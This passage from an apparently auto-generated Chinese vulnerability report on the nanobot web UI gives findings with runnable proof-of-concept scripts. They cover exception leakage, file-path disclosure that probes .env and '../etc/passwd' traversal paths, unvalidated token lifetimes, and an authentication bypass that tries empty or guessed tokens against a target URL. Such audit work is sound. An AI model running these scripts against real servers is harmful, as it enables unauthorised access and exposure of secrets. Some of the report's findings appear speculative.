        result = _extract_pdf(pdf_path)
        print(f"Result: {result}")
        print(f"[!] Exception message leaked: {result}")
        # The result will contain the exception message which may include:
        # - File paths
        # - Library versions
        # - Memory addresses
        # - System information
    finally:
        os.unlink(pdf_path)


def demonstrate_docx_leak():
    """Demonstrate information leakage through DOCX extraction."""
    print("\n=== DOCX Exception Information Leakage ===")
    docx_path = create_malicious_docx()
    try:
        result = _extract_docx(docx_path)
        print(f"Result: {result}")
        print(f"[!] Exception message leaked: {result}")
    finally:
        os.unlink(docx_path)


def demonstrate_xlsx_leak():
    """Demonstrate information leakage through XLSX extraction."""
    print("\n=== XLSX Exception Information Leakage ===")
    xlsx_path = create_malicious_xlsx()
    try:
        result = _extract_xlsx(xlsx_path)
        print(f"Result: {result}")
        print(f"[!] Exception message leaked: {result}")
    finally:
        os.unlink(xlsx_path)


def demonstrate_pptx_leak():
    """Demonstrate information leakage through PPTX extraction."""
    print("\n=== PPTX Exception Information Leakage ===")
    pptx_path = create_malicious_pptx()
    try:
        result = _extract_pptx(pptx_path)
        print(f"Result: {result}")
        print(f"[!] Exception message leaked: {result}")
    finally:
        os.unlink(pptx_path)


def demonstrate_extract_text_leak():
    """Demonstrate information leakage through the main extract_text function."""
    print("\n=== extract_text Exception Information Leakage ===")
    pdf_path = create_malicious_pdf()
    try:
        result = extract_text(pdf_path)
        print(f"Result: {result}")
        print(f"[!] Exception message leaked: {result}")
    finally:
        os.unlink(pdf_path)


if __name__ == "__main__":
    print("=" * 60)
    print("PoC for VULN-06C34A23 - Information Leakage via Exception Messages")
    print("仅供研究使用 (For research purposes only)")
    print("=" * 60)
    
    print("\n[!] This PoC demonstrates how exception messages containing")
    print("    sensitive information are leaked through document extraction functions.")
    print("    The leaked information may include:")
    print("    - File system paths")
    print("    - Library versions and installation paths")
    print("    - Memory addresses")
    print("    - System environment variables")
    print("    - Internal application state")
    
    try:
        demonstrate_pdf_leak()
        demonstrate_docx_leak()
        demonstrate_xlsx_leak()
        demonstrate_pptx_leak()
        demonstrate_extract_text_leak()
    except ImportError as e:
        print(f"\n[!] Import error: {e}")
        print("    This PoC requires the nanobot package to be installed.")
        print("    Install with: pip install nanobot")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)
    
    print("\n" + "=" * 60)
    print("PoC completed successfully.")
    print("=" * 60)
```

---

### VULN-1601310C - 信息泄露

- **严重等级:** MEDIUM
- **文件位置:** `nanobot/webui/file_preview.py:80`
- **数据流:** 文件路径直接暴露在响应中
- **判断理由:** 响应中返回了文件的绝对路径（str(resolved)）和项目路径（str(scope.project_path)），这可能会泄露服务器文件系统的目录结构信息。攻击者可以利用这些信息进行更精准的路径遍历攻击或了解服务器配置。

**代码片段:**
```
return {
    "path": str(resolved),
    "display_path": display_path,
    "project_path": str(scope.project_path),
    "language": _language_for_path(resolved),
    "content": content,
    "size": resolved.stat().st_size,
    "truncated": truncated,
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 信息泄露漏洞利用
漏洞ID: VULN-1601310C
仅供研究使用

该PoC演示如何通过file_preview接口获取服务器文件系统的绝对路径信息。
"""

import requests
import json
import sys

# 目标服务器配置
TARGET_URL = "http://target-server:port"  # 替换为实际目标地址


def exploit_file_preview_path_leak(target_url: str, file_path: str = "README.md") -> dict:
    """
    利用file_preview接口获取文件绝对路径信息
    
    Args:
        target_url: 目标服务器URL
        file_path: 要预览的文件路径（相对路径）
    
    Returns:
        包含泄露信息的响应字典
    """
    # 构造请求URL
    preview_url = f"{target_url}/api/file-preview"
    
    # 构造请求参数
    params = {
        "path": file_path
    }
    
    print(f"[*] 发送请求预览文件: {file_path}")
    print(f"[*] 请求URL: {preview_url}")
    
    try:
        # 发送GET请求
        response = requests.get(preview_url, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            print("\n[+] 成功获取文件预览信息！")
            print("=" * 60)
            
            # 提取并显示泄露的路径信息
            leaked_path = data.get("path", "N/A")
            leaked_project_path = data.get("project_path", "N/A")
            display_path = data.get("display_path", "N/A")
            
            print(f"[!] 泄露的绝对路径: {leaked_path}")
            print(f"[!] 泄露的项目路径: {leaked_project_path}")
            print(f"[!] 显示路径: {display_path}")
            
            # 分析泄露的信息
            print("\n[*] 信息泄露分析:")
            print(f"    - 服务器部署路径: {leaked_project_path}")
            print(f"    - 文件系统结构: {leaked_path}")
            print(f"    - 操作系统类型: {'Windows' if '\\' in leaked_path else 'Linux/Unix'}")
            
            # 尝试推断更多信息
            if leaked_project_path:
                path_parts = leaked_project_path.split("/")
                print(f"    - 项目名称: {path_parts[-1] if path_parts else 'Unknown'}")
                print(f"    - 目录深度: {len(path_parts)}")
            
            return data
        else:
            print(f"[-] 请求失败，状态码: {response.status_code}")
            print(f"[-] 响应内容: {response.text}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] 网络错误: {e}")
        return None
    except json.JSONDecodeError as e:
        print(f"[-] JSON解析错误: {e}")
        return None


def enumerate_directory_structure(target_url: str, known_paths: list) -> None:
    """
    利用泄露的路径信息枚举目录结构
    
    Args:
        target_url: 目标服务器URL
        known_paths: 已知的文件路径列表
    """
    print("\n[*] 尝试枚举目录结构...")
    print("=" * 60)
    
    # 常见的敏感文件路径
    sensitive_files = [
        ".env",
        "config.py",
        "settings.py",
        "docker-compose.yml",
        "requirements.txt",
        "package.json",
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
    ]
    
    for file_path in sensitive_files:
        print(f"\n[*] 尝试访问: {file_path}")
        result = exploit_file_preview_path_leak(target_url, file_path)
        if result:
            print(f"[+] 成功获取文件信息: {file_path}")
            # 检查是否泄露了更多路径信息
            if result.get("path"):
                print(f"    [!] 泄露的路径: {result['path']}")


def main():
    """主函数"""
    print("=" * 60)
    print("PoC - 信息泄露漏洞利用 (VULN-1601310C)")
    print("仅供研究使用")
    print("=" * 60)
    
    # 检查命令行参数
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = TARGET_URL
    
    print(f"\n[*] 目标服务器: {target_url}")
    
    # 步骤1: 获取基本文件信息
    print("\n[步骤1] 获取基本文件信息")
    print("-" * 40)
    result = exploit_file_preview_path_leak(target_url, "README.md")
    
    if result:
        # 步骤2: 尝试枚举更多文件
        print("\n[步骤2] 枚举敏感文件")
        print("-" * 40)
        enumerate_directory_structure(target_url, [result.get("path", "")])
        
        # 步骤3: 分析泄露信息
        print("\n[步骤3] 信息汇总")
        print("-" * 40)
        print("泄露的信息类型:")
        print("  1. 文件绝对路径 - 暴露服务器文件系统结构")
        print("  2. 项目部署路径 - 暴露项目在服务器上的位置")
        print("  3. 操作系统类型 - 通过路径格式推断")
        print("  4. 目录结构 - 通过路径深度和命名推断")
        
        print("\n潜在风险:")
        print("  1. 攻击者可以构建更精准的路径遍历攻击")
        print("  2. 暴露服务器配置信息")
        print("  3. 为后续攻击提供情报")


if __name__ == "__main__":
    main()
```

---

### VULN-61CDC4C2 - 不安全的令牌过期时间处理

- **严重等级:** MEDIUM
- **文件位置:** `nanobot/webui/gateway_tokens.py:53`
- **数据流:** 用户提供的ttl_s参数 -> float转换 -> 与当前时间相加 -> 存储为过期时间
- **判断理由:** ttl_s参数没有进行有效性验证，如果传入负数或零值，可能导致令牌立即过期或永不过期。虽然float转换会处理一些异常情况，但没有对ttl_s的范围进行限制。

**代码片段:**
```
expiry = time.monotonic() + float(ttl_s)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-61CDC4C2 - Unsafe token expiry handling
仅供研究使用
"""

import time
import secrets

# 模拟漏洞代码中的关键逻辑
class VulnerableTokenStore:
    def __init__(self):
        self.issued_tokens = {}
        self.api_tokens = {}

    def issue_token(self, ttl_s):
        token_value = f"nbwt_{secrets.token_urlsafe(32)}"
        expiry = time.monotonic() + float(ttl_s)
        self.issued_tokens[token_value] = expiry
        return token_value

    def issue_api_token(self, ttl_s):
        token_value = f"nbwt_{secrets.token_urlsafe(32)}"
        expiry = time.monotonic() + float(ttl_s)
        self.api_tokens[token_value] = expiry
        return token_value

    def check_token_valid(self, token_value, token_dict):
        expiry = token_dict.get(token_value)
        if expiry is None:
            return False
        if time.monotonic() > expiry:
            return False
        return True

print("=" * 60)
print("PoC: 不安全的令牌过期时间处理")
print("漏洞ID: VULN-61CDC4C2")
print("仅供研究使用")
print("=" * 60)

store = VulnerableTokenStore()

# 测试1: 负数ttl导致令牌立即过期
print("\n[测试1] 负数ttl_s (-10)")
token1 = store.issue_token(-10)
print(f"  令牌: {token1[:20]}...")
print(f"  立即检查有效性: {store.check_token_valid(token1, store.issued_tokens)}")
print("  => 令牌立即过期，无法使用")

# 测试2: 零ttl导致令牌立即过期
print("\n[测试2] 零ttl_s (0)")
token2 = store.issue_token(0)
print(f"  令牌: {token2[:20]}...")
print(f"  立即检查有效性: {store.check_token_valid(token2, store.issued_tokens)}")
print("  => 令牌创建后立即过期")

# 测试3: 极大ttl导致令牌几乎永不过期
print("\n[测试3] 极大ttl_s (1e100)")
token3 = store.issue_token(1e100)
print(f"  令牌: {token3[:20]}...")
print(f"  立即检查有效性: {store.check_token_valid(token3, store.issued_tokens)}")
print(f"  过期时间: {store.issued_tokens[token3]}")
print(f"  当前时间: {time.monotonic()}")
print("  => 令牌几乎永不过期，可被滥用")

# 测试4: 正常ttl作为对比
print("\n[测试4] 正常ttl_s (3600)")
token4 = store.issue_token(3600)
print(f"  令牌: {token4[:20]}...")
print(f"  立即检查有效性: {store.check_token_valid(token4, store.issued_tokens)}")
print(f"  过期时间: {store.issued_tokens[token4]}")
print(f"  当前时间: {time.monotonic()}")
print("  => 令牌正常有效")

print("\n" + "=" * 60)
print("漏洞影响总结:")
print("1. 负数ttl: 令牌立即过期，拒绝服务")
print("2. 零ttl: 令牌立即过期，拒绝服务")
print("3. 极大ttl: 令牌几乎永不过期，安全风险")
print("=" * 60)
```

---

### VULN-C6090437 - 不安全的认证机制 - 潜在的认证绕过

- **严重等级:** HIGH
- **文件位置:** `nanobot/webui/http_utils.py:176`
- **数据流:** 用户可控的Authorization头或X-Nanobot-Auth头 -> issue_route_secret_matches() -> 与配置的密钥比较 -> 返回是否匹配
- **判断理由:** 该函数存在多个安全风险：1) 如果 `configured_secret` 为空字符串，函数直接返回 `True`，这意味着未配置密钥时所有请求都会通过认证；2) 函数同时支持 `Authorization` 头和 `X-Nanobot-Auth` 头，增加了攻击面；3) 使用 `hmac.compare_digest()` 进行常量时间比较是正确的做法，但token的提取和清理（`strip()`）可能改变token值；4) 如果 `Authorization` 头中的token以空格开头或包含特殊字符，`strip()` 可能会改变token值。

**代码片段:**
```
def issue_route_secret_matches(headers: Any, configured_secret: str) -> bool:
    if not configured_secret:
        return True
    authorization = headers.get("Authorization") or headers.get("authorization")
    if authorization and authorization.lower().startswith("bearer "):
        supplied = authorization[7:].strip()
        return hmac.compare_digest(supplied, configured_secret)
    header_token = headers.get("X-Nanobot-Auth") or headers.get("x-nanobot-auth")
    if not header_token:
        return False
    return hmac.compare_digest(header_token.strip(), configured_secret)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-C6090437 - 不安全的认证机制导致的认证绕过
仅供安全研究使用
"""

import requests
import sys

# 目标URL（请替换为实际测试目标）
TARGET_URL = "http://target.example.com/api/sensitive-endpoint"

def exploit_empty_secret(target_url):
    """
    利用方式1：当configured_secret为空时，无需任何认证头即可绕过
    """
    print(f"[*] 尝试利用空密钥绕过认证 - 目标: {target_url}")
    print("[*] 发送不带任何认证头的请求...")
    
    try:
        response = requests.get(target_url, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] 成功！服务器返回200，认证已被绕过")
            print(f"[+] 响应内容预览: {response.text[:200]}...")
            return True
        elif response.status_code == 401 or response.status_code == 403:
            print(f"[-] 认证失败，状态码: {response.status_code}")
            print("[*] 这可能意味着configured_secret已配置，尝试其他方法...")
            return False
        else:
            print(f"[?] 收到状态码: {response.status_code}")
            print(f"[?] 响应: {response.text[:200]}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
        return False

def exploit_with_empty_bearer(target_url):
    """
    利用方式2：尝试使用空的Bearer token
    """
    print(f"\n[*] 尝试使用空的Bearer token - 目标: {target_url}")
    
    headers = {
        "Authorization": "Bearer "
    }
    
    try:
        response = requests.get(target_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] 成功！空的Bearer token绕过了认证")
            print(f"[+] 响应内容预览: {response.text[:200]}...")
            return True
        else:
            print(f"[-] 失败，状态码: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
        return False

def exploit_with_x_nanobot_auth(target_url):
    """
    利用方式3：使用X-Nanobot-Auth头（当Authorization头被过滤时）
    """
    print(f"\n[*] 尝试使用X-Nanobot-Auth头 - 目标: {target_url}")
    
    # 尝试不同的token值
    test_tokens = ["", "admin", "test", "*", "true"]
    
    for token in test_tokens:
        headers = {
            "X-Nanobot-Auth": token
        }
        
        try:
            response = requests.get(target_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"[+] 成功！使用X-Nanobot-Auth头，token='{token}'")
                print(f"[+] 响应内容预览: {response.text[:200]}...")
                return True
                
        except requests.exceptions.RequestException as e:
            print(f"[!] 请求失败: {e}")
    
    print("[-] 所有X-Nanobot-Auth尝试均失败")
    return False

def exploit_with_dual_headers(target_url):
    """
    利用方式4：同时使用两个认证头，测试优先级
    """
    print(f"\n[*] 尝试同时使用两个认证头 - 目标: {target_url}")
    
    headers = {
        "Authorization": "Bearer invalid_token",
        "X-Nanobot-Auth": ""  # 空token可能被接受
    }
    
    try:
        response = requests.get(target_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] 成功！双头请求绕过了认证")
            print(f"[+] 响应内容预览: {response.text[:200]}...")
            return True
        else:
            print(f"[-] 失败，状态码: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
        return False

def main():
    print("=" * 60)
    print("VULN-C6090437 PoC - 不安全的认证机制导致的认证绕过")
    print("仅供安全研究使用")
    print("=" * 60)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_URL
        print(f"\n[!] 未指定目标URL，使用默认: {target}")
        print("[!] 请使用: python3 poc.py <target_url>")
    
    print(f"\n[*] 开始测试目标: {target}")
    
    # 尝试所有利用方式
    success = False
    
    if exploit_empty_secret(target):
        success = True
    
    if exploit_with_empty_bearer(target):
        success = True
    
    if exploit_with_x_nanobot_auth(target):
        success = True
    
    if exploit_with_dual_headers(target):
        success = True
    
    print("\n" + "=" * 60)
    if success:
        print("[!] 漏洞确认：目标存在认证绕过漏洞")
        print("[!] 建议立即配置有效的认证密钥")
    else:
        print("[*] 未成功绕过认证，目标可能已配置密钥或存在其他防护")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

---



*报告由 CodeSentinel 自动生成*
